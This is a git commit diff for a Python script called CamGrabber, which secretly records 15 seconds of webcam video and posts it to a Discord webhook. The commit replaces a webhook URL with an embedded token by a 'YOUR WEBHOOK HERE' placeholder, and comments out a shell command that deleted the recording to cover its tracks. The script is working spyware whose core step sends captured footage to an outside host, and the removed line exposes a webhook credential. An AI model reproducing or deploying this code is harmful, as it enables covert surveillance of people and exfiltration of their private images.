64c0d5623da1f313d6958c96de3ae3adc35c6337
Xan0GDI <147054569+Xan0GDI@users.noreply.github.com>
2024-04-22 14:23:54 +0200

    Update and rename camgrabber.py to RAWcamgrabber.py

--- CamGrabber/RAWcamgrabber.py
+++ CamGrabber/RAWcamgrabber.py
@@ -1,11 +1,11 @@
 import imageio
 import requests
 import time
-import subprocess
+#import subprocess
 
 def CHEESE():
     aufnahme_dauer = 15
-    webcam_index = 0  # Index der Webcam (kann je nach System variieren)
+    webcam_index = 0
     cap = imageio.get_reader(f"<video{webcam_index}>", 'ffmpeg')
     fps = 200
     output_datei = 'video.mp4'
@@ -16,7 +16,7 @@ def CHEESE():
         if int(time.time() - startzeit) >= aufnahme_dauer:
             break
     writer.close()
-    webhook_url = "https://discord.com/api/webhooks/1231901318000545845/_MqBWYqrSzelpA1PSIPrmAJXDRpXJhKVKlDWoBbAUlLArdqllJALiIGkXPr6ypgc16wC"
+    webhook_url = "YOUR WEBHOOK HERE"
     dateipfad = 'video.mp4'
     with open(dateipfad, 'rb') as f:
         dateiinhalt = f.read()
@@ -24,5 +24,5 @@ def CHEESE():
         'file': ('video.mp4', dateiinhalt)
     }
     response = requests.post(webhook_url, files=payload)
-    subprocess.run("del video.mp4", shell=True)
+    #subprocess.run("del video.mp4", shell=True)
 CHEESE()
